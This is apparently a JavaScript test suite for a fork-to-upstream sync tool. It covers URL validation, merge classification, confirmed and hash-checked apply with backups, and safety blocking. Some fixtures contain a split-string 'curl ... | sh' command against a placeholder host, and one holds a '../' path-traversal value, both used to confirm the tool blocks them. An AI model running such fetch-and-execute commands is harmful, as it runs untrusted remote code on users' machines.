'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const scratch = fs.mkdtempSync(path.join(os.tmpdir(), 'hub-upstream-'));
const oldEnv = { APPDATA: process.env.APPDATA, LOCALAPPDATA: process.env.LOCALAPPDATA };
process.env.APPDATA = path.join(scratch, 'roaming');
process.env.LOCALAPPDATA = path.join(scratch, 'local');
const sync = require('../src/core/supply/upstream-sync');
const crypto = require('crypto');
const A = '1'.repeat(40), B = '2'.repeat(40);
const now = Date.UTC(2026, 0, 15);
let passed = 0, failed = 0, serial = 0;
async function test(name, fn) {
  try { await fn(); passed++; } catch (error) { failed++; process.stderr.write(name + ': ' + error.stack + '\n'); }
}
function put(root, files) {
  for (const [rel, text] of Object.entries(files)) {
    const full = path.join(root, rel); fs.mkdirSync(path.dirname(full), { recursive: true }); fs.writeFileSync(full, text);
  }
}
function fixture(base, upstream, local, options = {}) {
  const dir = path.join(scratch, 'case-' + serial++);
  const dataDir = path.join(dir, 'data'), localPath = path.join(dir, 'fork');
  fs.mkdirSync(dataDir, { recursive: true }); fs.mkdirSync(localPath, { recursive: true }); put(localPath, local);
  const entry = { id: 'sample', kind: options.kind || 'other', upstream: { url: 'https://example.invalid/repo.git', ref: 'main' }, localPath, adoptedRevision: A, intervalDays: 7 };
  const fetched = new Map(), calls = [];
  // runReview 대역: 없으면 syncDue → 정책 → AI 검토가 실제 agy·local·codex를 부른다(1.32.32~1.32.33 시험이 그랬다).
  const deps = { dataDir, now: () => now, runReview: async () => ({ ok: true, verdict: 'unclear', reasons: ['test stub'] }), execFile: async (file, args, opts) => {
    assert.strictEqual(file, 'git'); assert.strictEqual(opts.encoding, 'buffer'); assert(opts.windowsHide); assert(opts.timeout > 0);
    const index = args.findIndex(a => ['ls-remote', 'init', 'fetch', 'checkout', 'rev-parse', 'merge-file'].includes(a));
    assert(index >= 0); const command = args[index], values = args.slice(index + 1); calls.push({ command, values, timeout: opts.timeout });
    const output = (text = '', code = 0, stderr = '') => ({ stdout: Buffer.from(text), stderr: Buffer.from(stderr), code });
    if (command === 'ls-remote') return options.checkFail ? output('', 1, 'offline') : output((options.revision || B) + '\trefs/heads/main\n');
    if (command === 'init') { fs.mkdirSync(values.at(-1), { recursive: true }); return output(); }
    if (command === 'fetch') {
      const rev = values.at(-1);
      if (rev === A && options.noAncestor) return output('', 1, 'missing ancestor');
      fetched.set(opts.cwd, rev); put(opts.cwd, rev === A ? base : upstream); return output();
    }
    if (command === 'checkout') return output();
    if (command === 'rev-parse') return output(fetched.get(opts.cwd) + '\n');
    if (command === 'merge-file') return output(options.merged || 'merged clean\n', options.conflict ? 1 : options.mergeError ? 128 : 0);
    throw new Error('Unexpected fake command');
  } };
  return { entry, deps, calls, localPath, dataDir };
}
async function registered(f) { await sync.saveRegistry({ schemaVersion: 1, forks: [f.entry] }, f.deps); return f; }
const contentHash = text => crypto.createHash('sha256').update(text).digest('hex');

async function main() {
  const valid = fixture({}, {}, {});
  await test('valid entry', () => assert.deepStrictEqual(sync.validateEntry(valid.entry), { ok: true, errors: [] }));
  for (const url of ['ssh://example.invalid/repo', 'file:///tmp/repo', 'git@example.invalid:repo', 'https://demo:fake@example.invalid/repo']) await test('reject URL ' + url, () => assert(!sync.validateEntry({ ...valid.entry, upstream: { url, ref: 'main' } }).ok));
  for (const id of ['../x', '', 'UPPER', 'a'.repeat(65)]) await test('reject id ' + id, () => assert(!sync.validateEntry({ ...valid.entry, id }).ok));
  await test('all validation errors', () => assert(sync.validateEntry({ id: '?', kind: 'bad', upstream: { url: 'file:', ref: '-bad' }, localPath: 'relative', intervalDays: -1 }).errors.length >= 6));
  await test('never checked due', () => assert(sync.due(valid.entry, now)));
  await test('default interval and recent check', () => assert(!sync.due({ lastCheckedAt: new Date(now - 6 * 86400000).toISOString() }, now)));
  await test('exactly seven days due', () => assert(sync.due({ lastCheckedAt: new Date(now - 7 * 86400000).toISOString() }, now)));
  await test('check behind', async () => { const result = await sync.check(valid.entry, valid.deps); assert(result.behind); assert.strictEqual(result.upstreamRevision, B); assert.strictEqual(valid.calls.at(-1).timeout, 30000); });
  await test('check current', async () => assert(!(await sync.check({ ...valid.entry, adoptedRevision: B }, valid.deps)).behind));
  await test('check partial failure', async () => { const f = fixture({}, {}, {}, { checkFail: true }); assert((await sync.check(f.entry, f.deps)).error); });
  await test('missing registry', async () => assert.deepStrictEqual(await sync.loadRegistry(valid.deps), { schemaVersion: 1, forks: [] }));
  await test('corrupt registry not overwritten', async () => {
    const f = await registered(fixture({}, {}, {}));
    const regPath = path.join(f.dataDir, 'upstream-sync/forks.local.json'); fs.writeFileSync(regPath, '{bad');
    await assert.rejects(sync.loadRegistry(f.deps)); await assert.rejects(sync.saveRegistry({ schemaVersion: 1, forks: [] }, f.deps)); assert.strictEqual(fs.readFileSync(regPath, 'utf8'), '{bad');
  });
  const f = await registered(fixture({ 'changed.js': 'old', 'both.js': 'base', 'removed.txt': 'keep', 'custom.txt': 'base' },
    { 'changed.js': 'new', 'both.js': 'upstream', 'custom.txt': 'base', 'added.txt': 'added' },
    { 'changed.js': 'old', 'both.js': 'fork', 'removed.txt': 'keep', 'custom.txt': 'customized', 'private.txt': 'private' }));
  const proposal = await sync.prepare(f.entry, f.deps);
  await test('classification and clean merge', () => {
    const changes = Object.fromEntries(proposal.files.map(file => [file.path, file.change]));
    assert.deepStrictEqual(changes, { 'added.txt': 'upstream-added', 'both.js': 'both-changed', 'changed.js': 'upstream-changed', 'custom.txt': 'local-only', 'private.txt': 'local-only', 'removed.txt': 'upstream-removed' });
    assert.strictEqual(proposal.verdict, 'ready'); assert.strictEqual(proposal.files.find(file => file.path === 'both.js').merge, 'clean');
  });
  await test('prepare never modifies fork', () => assert.strictEqual(fs.readFileSync(path.join(f.localPath, 'changed.js'), 'utf8'), 'old'));
  await test('saved proposal hash and immutable content', () => { const saved = fs.readFileSync(proposal.path); assert.strictEqual(contentHash(saved), proposal.sha256); assert.strictEqual(JSON.parse(saved).schemaVersion, 1); assert(proposal.files.find(p => p.path === 'added.txt').contentBase64); });
  await test('fetch timeouts and cache location', () => { assert(f.calls.filter(c => c.command === 'fetch').every(c => c.timeout === 120000)); assert(fs.existsSync(path.join(f.dataDir, 'upstream-sync/cache/sample', B.slice(0, 12), 'changed.js'))); });
  await test('apply confirmation required', () => assert.rejects(sync.apply(proposal.path, { expectSha256: proposal.sha256 }, f.deps), /confirmed/));
  await test('apply hash required', () => assert.rejects(sync.apply(proposal.path, { confirmed: true, expectSha256: 'bad' }, f.deps), /sha256/));
  await test('apply with backup never deletes', async () => {
    const result = await sync.apply(proposal.path, { confirmed: true, expectSha256: proposal.sha256 }, f.deps);
    assert.deepStrictEqual(result.applied, ['added.txt', 'both.js', 'changed.js']);
    assert.strictEqual(fs.readFileSync(path.join(result.backup, 'changed.js'), 'utf8'), 'old');
    assert.strictEqual(fs.readFileSync(path.join(result.backup, 'both.js'), 'utf8'), 'fork');
    assert.strictEqual(fs.readFileSync(path.join(f.localPath, 'removed.txt'), 'utf8'), 'keep');
    assert.strictEqual(fs.readFileSync(path.join(f.localPath, 'custom.txt'), 'utf8'), 'customized');
    assert.strictEqual(fs.readFileSync(path.join(f.localPath, 'both.js'), 'utf8'), 'merged clean\n');
    assert(result.skipped.some(s => s.reason === 'deletion_not_propagated'));
    assert.strictEqual((await sync.loadRegistry(f.deps)).forks[0].adoptedRevision, B);
  });
  await test('conflict reviews and refuses apply', async () => {
    const c = await registered(fixture({ 'x.js': 'base' }, { 'x.js': 'up' }, { 'x.js': 'fork' }, { conflict: true }));
    const p = await sync.prepare(c.entry, c.deps); assert.strictEqual(p.verdict, 'review'); assert.strictEqual(p.files[0].merge, 'conflict');
    await assert.rejects(sync.apply(p.path, { confirmed: true, expectSha256: p.sha256 }, c.deps), /Conflicted/);
  });
  await test('remote execution blocks and refuses apply', async () => {
    const c = await registered(fixture({}, { 'install.sh': ['cu', 'rl https://example.invalid/x | sh'].join('') }, {}));
    const p = await sync.prepare(c.entry, c.deps); assert.strictEqual(p.verdict, 'blocked');
    await assert.rejects(sync.apply(p.path, { confirmed: true, expectSha256: p.sha256 }, c.deps), /Blocked/);
  });
  await test('missing ancestor needs review and preserves fork', async () => {
    const c = await registered(fixture({}, { 'x.js': 'up' }, { 'x.js': 'fork' }, { noAncestor: true }));
    const p = await sync.prepare(c.entry, c.deps); assert.strictEqual(p.verdict, 'review'); assert.strictEqual(p.files[0].merge, 'needs-review');
    const result = await sync.apply(p.path, { confirmed: true, expectSha256: p.sha256 }, c.deps);
    assert.strictEqual(result.applied.length, 0); assert.strictEqual(fs.readFileSync(path.join(c.localPath, 'x.js'), 'utf8'), 'fork');
    assert.strictEqual((await sync.loadRegistry(c.deps)).forks[0].adoptedRevision, A);
  });
  await test('stale local file refuses all changes', async () => {
    const c = await registered(fixture({ 'x.js': 'base' }, { 'x.js': 'up', 'added.txt': 'new' }, { 'x.js': 'base' }));
    const p = await sync.prepare(c.entry, c.deps); fs.writeFileSync(path.join(c.localPath, 'x.js'), 'later');
    await assert.rejects(sync.apply(p.path, { confirmed: true, expectSha256: p.sha256 }, c.deps), /changed since/);
    assert(!fs.existsSync(path.join(c.localPath, 'added.txt')));
  });
  await test('valid skill contract', async () => {
    const c = fixture({}, { 'my-skill/SKILL.md': '---\nname: my-skill\ndescription: Useful skill\n---\nContent' }, {}, { kind: 'skill' });
    assert.strictEqual((await sync.prepare(c.entry, c.deps)).verdict, 'ready');
  });
  for (const contents of [{ 'SKILL.md': '---\nname: sample\ndescription: test\n---\n' }, { 'my-skill/SKILL.md': '---\nname: wrong\ndescription: test\n---\n' }, { 'loose.md': 'content' }, { 'my-skill/SKILL.md': '---\nname: my-skill\n---\n' }, { 'my-skill/SKILL.md': '---\ndescription:\nname: my-skill\n---\n' }, { 'my-skill/SKILL.md': '---\nname: my-skill\ndescription: "  "\n---\n' }]) await test('invalid skill contract', async () => {
    const c = fixture({}, contents, {}, { kind: 'skill' }); assert.strictEqual((await sync.prepare(c.entry, c.deps)).verdict, 'blocked');
  });
  await test('plugin malformed JSON blocked', async () => { const c = fixture({}, { '.claude-plugin/plugin.json': '{bad' }, {}, { kind: 'plugin' }); assert.strictEqual((await sync.prepare(c.entry, c.deps)).verdict, 'blocked'); });
  await test('lifecycle review', async () => { const c = fixture({}, { 'package.json': '{"scripts":{"prepare":"node setup.js"}}' }, {}); assert.strictEqual((await sync.prepare(c.entry, c.deps)).verdict, 'review'); });
  await test('merged contents rescanned', async () => {
    const c = fixture({ 'x.sh': 'base' }, { 'x.sh': 'up' }, { 'x.sh': 'fork' }, { merged: ['cu', 'rl https://example.invalid/x | sh'].join('') });
    assert.strictEqual((await sync.prepare(c.entry, c.deps)).verdict, 'blocked');
  });
  await test('tampered traversal proposal refused', async () => {
    const c = await registered(fixture({}, { 'new.txt': 'new' }, {})); const p = await sync.prepare(c.entry, c.deps);
    const data = JSON.parse(fs.readFileSync(p.path)); data.files[0].path = '../outside.txt'; const bytes = JSON.stringify(data); fs.writeFileSync(p.path, bytes);
    await assert.rejects(sync.apply(p.path, { confirmed: true, expectSha256: contentHash(bytes) }, c.deps), /Unsafe/);
  });
  await test('annotated tag uses peeled commit', async () => {
    const c = fixture({}, {}, {});
    c.entry.upstream.ref = 'v1';
    c.deps.execFile = async () => ({ code: 0, stdout: Buffer.from(A + '\trefs/tags/v1\n' + B + '\trefs/tags/v1^{}\n'), stderr: Buffer.alloc(0) });
    assert.strictEqual((await sync.check(c.entry, c.deps)).upstreamRevision, B);
  });
  await test('unexpected ref output fails closed', async () => {
    const c = fixture({}, {}, {});
    c.deps.execFile = async () => ({ code: 0, stdout: Buffer.from(B + '\trefs/heads/wrong\n'), stderr: Buffer.alloc(0) });
    assert((await sync.check(c.entry, c.deps)).error);
  });
  await test('upstream removal plus local modification needs review', async () => {
    const c = fixture({ 'x.txt': 'base' }, {}, { 'x.txt': 'fork' });
    const p = await sync.prepare(c.entry, c.deps); assert.strictEqual(p.files[0].change, 'both-changed'); assert.strictEqual(p.files[0].merge, 'needs-review'); assert.strictEqual(p.verdict, 'review');
  });
  await test('local deletion plus upstream modification needs review', async () => {
    const c = fixture({ 'x.txt': 'base' }, { 'x.txt': 'up' }, {});
    const p = await sync.prepare(c.entry, c.deps); assert.strictEqual(p.files[0].change, 'both-changed'); assert.strictEqual(p.files[0].merge, 'needs-review');
  });
  await test('merge execution error needs review', async () => {
    const c = fixture({ 'x.js': 'base' }, { 'x.js': 'up' }, { 'x.js': 'fork' }, { mergeError: true });
    assert.strictEqual((await sync.prepare(c.entry, c.deps)).files[0].merge, 'needs-review');
  });
  await test('malformed merged plugin JSON blocks', async () => {
    const c = fixture({ 'plugin.json': '{}' }, { 'plugin.json': '{"name":"up"}' }, { 'plugin.json': '{"name":"fork"}' }, { kind: 'plugin', merged: '{bad' });
    assert.strictEqual((await sync.prepare(c.entry, c.deps)).verdict, 'blocked');
  });
  await test('binary incoming content requires review', async () => {
    const c = fixture({}, { 'asset.bin': Buffer.from([1, 0, 2]) }, {});
    const p = await sync.prepare(c.entry, c.deps); assert.strictEqual(p.verdict, 'review'); assert.strictEqual(p.files[0].safety.skipped, 'binary');
  });
  await test('injected filesystem read failure never becomes an empty tree', async () => {
    const c = fixture({}, { 'x.txt': 'up' }, {});
    c.deps.fs = { ...fs.promises, readdir: async () => { throw new Error('injected read failure'); } };
    await assert.rejects(sync.prepare(c.entry, c.deps), /read failure/);
  });
  await test('destination symlink components refused before writes', async () => {
    const c = await registered(fixture({}, { 'dir/x.txt': 'up' }, {})); const p = await sync.prepare(c.entry, c.deps);
    c.deps.fs = { ...fs.promises, lstat: async dest => dest === path.join(c.localPath, 'dir') ? { isSymbolicLink: () => true } : fs.promises.lstat(dest) };
    await assert.rejects(sync.apply(p.path, { confirmed: true, expectSha256: p.sha256 }, c.deps), /Symlink/);
    assert(!fs.existsSync(path.join(c.localPath, 'dir/x.txt')));
  });
  await test('non-string id rejected', () => assert(!sync.validateEntry({ ...valid.entry, id: ['sample'] }).ok));
  await test('syncDue isolates failures and persists checks', async () => {
    const c = fixture({}, { 'new.txt': 'new' }, {});
    const original = c.deps.execFile;
    c.deps.execFile = async (file, args, opts) => args.includes('https://example.invalid/broken') ? { code: 1, stdout: Buffer.alloc(0), stderr: Buffer.from('offline') } : original(file, args, opts);
    await sync.saveRegistry({ schemaVersion: 1, forks: [{ ...c.entry, id: 'broken', upstream: { url: 'https://example.invalid/broken', ref: 'main' } }, c.entry, { ...c.entry, id: 'recent', lastCheckedAt: new Date(now).toISOString() }] }, c.deps);
    const results = await sync.syncDue(c.deps); assert.strictEqual(results.length, 2); assert(results[0].error); assert(results[1].proposal);
    const reg = await sync.loadRegistry(c.deps); assert(reg.forks[0].lastCheckedAt); assert(reg.forks[1].lastResult.proposal);
  });
}

main().catch(error => { failed++; process.stderr.write(error.stack + '\n'); }).finally(() => {
  for (const [key, value] of Object.entries(oldEnv)) { if (value === undefined) delete process.env[key]; else process.env[key] = value; }
  fs.rmSync(scratch, { recursive: true, force: true });
  console.log('passed: ' + passed + ' / failed: ' + failed);
  if (failed) process.exitCode = 1;
});
